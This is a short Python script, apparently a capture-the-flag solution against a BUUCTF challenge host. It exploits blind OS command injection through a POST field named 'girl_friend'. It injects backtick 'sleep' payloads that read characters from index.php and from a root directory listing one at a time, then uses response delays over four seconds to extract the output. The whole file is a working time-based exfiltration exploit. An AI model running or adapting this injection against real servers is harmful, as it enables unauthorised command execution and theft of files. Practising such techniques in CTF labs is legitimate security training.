import requests
import time
url = "http://b5b214ff-2fb0-4114-bca6-cdd1c1fafe05.node3.buuoj.cn/index.php"
data = {"girl_friend": "sleep `head -n 1 index.php| cut -c1|tr \< 4`"}
characters="/.{}1234567890-abcdefghijklmnopqrstvuwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
payload="sleep `head -n 1 index.php| cut -c{}|tr {} 4`"
result=""
for i in range(1,51):
    for c in characters:
        payload="sleep `find / -maxdepth 1|head -n 12 |tail -n 1| cut -c{}|tr {} 4`".format(i,c)
        data["girl_friend"]=payload
        start=time.time()
        requests.post(url=url,data=data)
        end= time.time()
        if(end-start >4):
            result+=c
            break
    print(result)
# requests.post()
